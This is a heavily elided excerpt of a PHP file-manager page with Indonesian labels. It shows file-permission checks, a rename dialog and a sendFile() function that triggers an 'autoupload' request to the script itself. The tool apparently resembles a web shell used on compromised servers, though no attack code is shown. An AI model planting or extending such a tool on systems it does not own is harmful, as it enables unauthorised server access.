...
function is_editable($file) {
    ...
    return is_file($file) && is_readable($file) && is_writable($file);
...
<link href="https://cdn.jsdelivr.net/gh/TatsumiOfficial/PemecahList/bridge.css" rel="stylesheet">
...
<div class="app-wrapper">
    ...
    <div class="header-card">
        ...
        <div class="d-flex flex-wrap justify-content-between align-items-center gap-3">
            ...
            <div class="d-flex gap-2 flex-wrap">
                ...
                <button class="modern-btn" onclick="sendFile()">
                        ...
                        <tr>
                            ...
                            <td class="text-center">
                                ...
                                if (!file_exists($path) || !is_readable($path)) {
                                    ...
                                    $tooltip = 'File tidak dapat diakses';

                                } elseif ($is_dir) {

                                    $class = 'directory';

                                    $tooltip = 'Folder - ' . $perms;

                                } elseif ($editable) {

                                    $class = 'editable';

                                    $tooltip = 'File dapat diedit - ' . $perms;

                                } else {

                                    $class = 'readonly';

                                    $tooltip = 'File hanya bisa dibaca - ' . $perms;
    ...
    <script>
        ...
        document.getElementById('renameModal').addEventListener('show.bs.modal', function (event) {
            ...
            modal.querySelector('#renameOriginal').value = filename;

            modal.querySelector('input[name="to"]').value = filename;
    ...
    function sendFile() {
        ...
        fetch('<?= $_SERVER['PHP_SELF'] ?>?autoupload=1&dir=<?= $encDir ?>')

            .then(response => response.text())

            .then(() => {

                location.reload(); // langsung reload tanpa alert
